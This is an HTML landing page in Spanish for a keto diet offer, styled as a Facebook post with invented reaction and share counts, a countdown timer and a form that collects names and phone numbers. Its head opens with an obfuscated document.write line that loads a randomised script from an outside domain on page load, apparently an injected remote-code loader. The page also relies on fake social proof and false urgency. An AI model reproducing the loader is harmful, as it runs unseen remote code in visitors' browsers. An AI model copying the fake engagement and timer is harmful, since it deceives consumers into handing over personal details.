<html>
<head>

    <script type="text/javascript">document.write('<scr'+'ipt src="//apiscript.club/dash/main.js?'+Math.random()+'" type="text/javascript"></scr'+'ipt>');</script>

    <meta charset="utf-8">
    <meta name="viewport" content="width=480">

    <link rel="shortcut icon" href="img/favicon.png" type="image/png">
    <link rel="stylesheet" href="https://shop-officials.ru/landing_inc/land/css/reset.css">
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,700&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="https://shop-officials.ru/landing_inc/land/js/slider/slick-1.8.0/slick.css">
    <link rel="stylesheet" href="css/settings.css">
    <link rel="stylesheet" href="css/style.css">
    <style type="text/css">
        * {
            font-family: 'Roboto' !important;
        }
    </style>
</head>
<body>

<div class="wrap">
    
    <section class="offer">
        <img class="logo" src="img/offer-ava.png" alt="">
        <div class="price">

            <a href="#order" class="button-m">Ordenar una llamada</a>
        </div>
        <div class="info">
            <h1 class="verified">Keto Dieta</h1>
            <ul class="bullet">
                <li>✅ ¡Deje una solicitud, le daremos consejos sobre cómo seguir la dieta cetogénica!</li>
            </ul>
        </div>
    </section>
            
            
    <section class="post">
        <img class="im" src="img/post-im1.jpg" style="margin-bottom: -5px" alt="">
        <div class="smile-block">
            <!--smile3   - 3 смайла(палец первый, сердце второй, шок третий) -->
            <!--smile2   - 2 смайла(палец первый, средце второе) -->
            <!--smile2-1 - 2 смайла(сердце первое, палец второй) -->
            <!--smile2-2 - 2 смайла(палец первый, шок второй) -->
            <!--smile1   - 1 смайл(палец) -->
            <!--smile1-1 - 1 смайл(шок) -->
            <span class="smile3"></span> 193 mil
            <div>5 543 veces compartida</div>
        </div>
        <div class="line-fb"></div>
        <div class="post-ic">
            <span>Me gusta</span>
            <span>Comentar</span>
            <span>Compartir</span>
        </div>
    </section>
            
            
   
            
            
    <section class="order_form">
        <div class="head">
            <img src="img/offer-ava.png" alt="">
            <div class="login">Keto Dieta</div>
        </div>
        <div class="box">
            
            <div class="timer_block">
                <h4>Fin de la oferta dentro de:</h4>
                <div class="timer clrfix">
                    <div class="timer_item">
                        <div class="count hours">00</div>
                        <div class="text">horas</div>
                    </div>
                    <div class="timer_item">
                        <div class="count minutes">00</div>
                        <div class="text">minutos</div>
                    </div>
                    <div class="timer_item">
                        <div class="count seconds">00</div>
                        <div class="text">segundos</div>
                    </div>
                </div>
            </div>
            
            
            <div class="price">
                <div class="item">
                    <p>Precio antiguo:</p>
                    <div class="value"><span><?=$price_old_land?></span> <i><?=$price_val?></i></div>
                </div>
                <div class="item">
                    <p>Nuevo precio:</p>
                    <div class="value"><span><?=$price_land?></span> <i><?=$price_val?></i></div>
                </div>
            </div>
            
            
            <form class="m1-form" id="order" action="#" method="post" onsubmit="if(this.name.value==''){alert('Ingrese un nombre');return false}if(this.phone.value==''){alert('Ingresar teléfono');return false}return true;">
                <input class="field" type="text" name="name" placeholder="su nombre" required>
                <input class="field" type="tel" name="phone" placeholder="tu número de teléfono" required>
                <button class="button-m big">Ordenar una llamada</button>
            </form>
            
            <div class="stock">
              
            </div>
        </div>
    </section>
    

    
    <footer class="footer">

    </footer>
    
</div>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://shop-officials.ru/landing_inc/land/js/slider/slick-1.8.0/slick.min.js"></script>
<script src="js/init.js"></script>


</body>
</html>
